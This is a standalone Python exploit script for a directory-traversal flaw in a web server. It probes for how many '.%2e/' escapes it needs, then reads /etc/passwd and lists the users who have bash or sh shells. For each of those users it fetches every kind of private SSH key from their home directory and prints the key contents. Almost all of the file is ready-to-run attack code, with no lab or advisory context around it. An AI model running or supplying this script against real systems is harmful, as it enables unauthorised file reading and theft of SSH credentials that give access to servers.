import requests
from sys import argv
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

keys = [
    "id_rsa",
    "id_ecdsa",
    "id_ecdsa_sk",
    "id_ed25519",
    "id_ed25519_sk",
    "id_dsa",
]


def http_get(url: str):
    """this extra step is neede, because requests escapes ../ path travervals. This workaround works like curl --path-as-is."""
    logging.debug(f"[-] HTTP GET {url}")
    s = requests.Session()
    req = requests.Request(method="get", url=url)
    prep = req.prepare()
    prep.url = url
    return s.send(prep, verify=False)


def get_escape_count(base_url: str, target_file: str) -> int:
    logging.info("[*] Determining escape count...")
    for i in range(15):
        url = f"{base_url}{'.%2e/' * i}{target_file}"
        logging.info(f"[*] trying {url}")
        response = http_get(url)
        if response.status_code == 200 and len(response.text):
            logging.info(f"[+] Found valid escape count: {i}")
            return i
    raise Exception("Could not determine escape count")


def get_file(base_url: str, target_file: str, escape_count: int) -> str | None:
    url = f"{base_url}{'.%2e/' * escape_count}{target_file}"
    response = http_get(url)
    if response.ok:
        return response.text
    return None


def users_from_passwd(
    passwd_content: str,
) -> dict[str, str]:  # username: home directory
    logging.info("[*] Parsing /etc/passwd for users with shell access...")
    users = {}
    for line in passwd_content.splitlines():
        if line:
            parts = line.split(":")
            if parts[-1] == "/bin/bash" or parts[-1] == "/bin/sh":
                users[parts[0]] = parts[-2]
    logging.info(f"[+] Extracted users: {users}")
    return users


def get_ssh_keys_from_users(base_url: str, users: dict[str, str], escape_count: int):
    logging.info("[*] Attempting to retrieve SSH keys...")
    for user, home_dir in users.items():
        logging.info(f"[*] Trying to extract ssh keys from: {user}")
        for key in keys:
            target_file = f"{home_dir[1:]}/.ssh/{key}"
            key_content = get_file(base_url, target_file, escape_count)
            if key_content:
                logging.info(
                    f"Found SSH key of type {key} for user {user}:\n{key_content}"
                )


def main(base_url: str):
    escape_count = get_escape_count(base_url, "etc/passwd")
    passwd_content = get_file(base_url, "etc/passwd", escape_count)
    if not passwd_content:
        logging.error("Could not retrieve /etc/passwd")
        return

    users = users_from_passwd(passwd_content)

    get_ssh_keys_from_users(base_url, users, escape_count)


if __name__ == "__main__":
    if len(argv) > 1:
        main(argv[1])
    else:
        logging.error("Usage: python ssh.py <base_url>")
